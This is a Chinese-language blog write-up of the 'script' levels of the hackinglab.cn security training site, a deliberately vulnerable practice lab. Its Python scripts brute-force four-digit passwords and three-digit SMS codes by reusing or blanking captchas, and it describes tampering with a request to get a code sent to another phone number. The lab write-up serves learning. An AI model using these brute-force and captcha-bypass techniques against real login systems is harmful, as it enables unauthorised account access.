---
layout: post
title: 网络安全实验室--脚本关writeup
tag: codes
---

<h2>开始</h2>

最近开始搞网络安全方面的实践，找到了[网络安全实验室](http://hackinglab.cn)这个网站。做了小部分的题目，顺便记录下做题过程的writeup。

<h5>脚本关</h5>脚本关

<h6>[第一关]</h6>

点击链接后，页面会直接跳转到no_key_is_here_forever.php这个页面，然而根据页面源代码，应该是首先跳转到search_key.php。

<img src="/images/writeup1.png" />

所以，在search_key.php这个页面存在猫腻，接下来就是利用brup suite进行对数据的截取。
在http history中，找到三次get数据，其中关于search_key.php的响应如下：

<img src="/images/writeup1_1.png" />

Get Key! 从响应中也能发现，返回了一段script代码，页面自动跳转到no_key_is_here_forever.php，所以看不到返回的key。

<h6>[第二关]</h6>

经过观察，给出式子的格式是固定的，那么就只要获取数字，代入公式一样得出结果。
所以用python写脚本：

{% highlight python %}
#coding:utf-8
import requests
from bs4 import BeautifulSoup
import re

cookie = {'PHPSESSID':'9515090a314ddc0f6d7641af16f75fda'}
url = 'http://lab1.xseclab.com/xss2_0d557e6d2a4ac08b749b61473a075be1/index.php'
response = requests.get(url,cookies=cookie)

soup = BeautifulSoup(response.text,'html.parser')
form = soup.find('form')
form = str(form)
snum = re.findall(r'\d+',form)

num = []
for n in snum[1:]:
	num.append(int(n))

result = num[0] * num[1] +num[2] * (num[3] + num[4])

post = {'v' : result}
res = requests.post(url,cookies=cookie,data=post)

print res.content
{% endhighlight %}
结果：

<img src="/images/writeup2_1.png" />

Get key!

<h6>[第三关]</h6>

第三关没有链接，提示是这个题目是空的，空的，空：null(还提示是小写)。

<h6>[第四关]</h6>

点击网页上的链接，并没有出现弹窗。观察了一下页面源码。

<img src="/images/writeup4_1.png" />

前两个js函数导致弹窗的失败，试过把后面所要的代码放进到chrome中的console中运行，报错。然后就只能直接保存页面，删除文件里面的两个函数，直接打开。

<img src="/images/writeup4_2.png" />

Get key!

<h6>[第五关]</h6>

暴力破解4位纯数字的密码，但是有验证码。虽然python能自动识别验证码，但是应该也能有什么绕过的方法。
依旧是开启brup suite，对提交的数据进行获取，然后放进brup suite里面重复提交，偶然发现只要页面没有进行刷新，产生的验证码就一直有效。
既然是脚本关，那就得用脚本来解决问题。

{% highlight python%}
#coding:utf-8

import requests

url = 'http://lab1.xseclab.com/vcode1_bcfef7eacf7badc64aaf18844cdb1c46/index.php'

username = 'admin'
submit = 'submit'

pwd = 1000
cookie = {'PHPSESSID':'9515090a314ddc0f6d7641af16f75fda'}
while True:
	post = {"username":username,'pwd':pwd,'vcode':'zp9p','submit':submit}

	res = requests.post(url,data=post,cookies=cookie)

	print res.content,'...',pwd
	pwd += 1
	if 'pwd' not in res.content:
		break

{% endhighlight %}

<img src="/images/writeup5_1.png" />

Get key!

<h6>[第六关]</h6>

依旧是验证码的问题。试试留空能不能绕过。

{% highlight python%}
#coding:utf-8

import requests

url = 'http://lab1.xseclab.com/vcode1_bcfef7eacf7badc64aaf18844cdb1c46/index.php'

username = 'admin'
submit = 'submit'

pwd = 1000
cookie = {'PHPSESSID':'9515090a314ddc0f6d7641af16f75fda'}
while True:
	post = {"username":username,'pwd':pwd,'vcode':'','submit':submit}

	res = requests.post(url,data=post,cookies=cookie)

	print res.content,'...',pwd
	pwd += 1
	if 'pwd' not in res.content:
		break

{% endhighlight %}

<img src="/images/writeup6_1.png" />

Get key!

<h6>[第七关]</h6>

同上，留空绕过验证码。

<img src="/images/writeup7_1.png" />

<h6>[第八关]</h6>

暂时没有解出来。

<h6>[第九关]</h6>

手机验证码登录，获取验证码后，提示please login as 13388886667，那就用这个号登录呗，又被告知

<img src="/images/writeup9_1.png" />

只能再用brup suite进行截取数据了。

<img src="/images/writeup9_2.png" />

有用只有6666这个号码能获取到验证码，那么就修改下数据包里面的参数，将号码改成6666获取一波验证码，试试看有没有用。

<img src="/images/writeup9_3.png" />

Get Key!

<h6>[第十关]</h6>
依旧是验证码，三位数的，python暴力的跑吧。

{% highlight python %}
#coding:utf-8

import requests

url = 'http://lab1.xseclab.com/vcode6_mobi_b46772933eb4c8b5175c67dbc44d8901/login.php'

username = '13388886666'
submit = 'submit'

vcode = 100
fobj = open('t.html','w')

cookie = {'PHPSESSID':'9515090a314ddc0f6d7641af16f75fda'}
while True:
	post = {"username":username,'vcode':vcode,'login':submit}

	res = requests.post(url,data=post,cookies=cookie)

	print res.content,'...',vcode
	vcode += 1
	fobj.writelines(res.content)
	if 'key'  in res.content:
		break

{% endhighlight %}
将所有的响应结果保存下来，发现这个。

<img src="/images/writeup10_1.png" />

再登录提示的账号，只要修改脚本里面的username就可以了。

<img src="/images/writeup10_2.png" />

Get Key!
